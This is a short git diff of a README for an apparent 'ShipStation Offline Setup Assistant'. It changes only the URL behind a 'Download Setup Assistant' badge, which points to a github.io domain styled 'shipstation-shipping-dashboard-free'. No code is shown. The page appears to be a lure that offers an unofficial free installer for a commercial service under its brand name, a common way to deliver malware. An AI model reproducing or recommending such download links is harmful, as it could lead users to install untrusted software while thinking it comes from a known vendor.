@@ -1,6 +1,6 @@
 # 🚚 ShipStation — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://shipstation-shipping-dashboard-free.github.io/github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://shipstation-shipping-dashboard-free.github.io/.github)
 
 ## ⚙️ How to Use
 
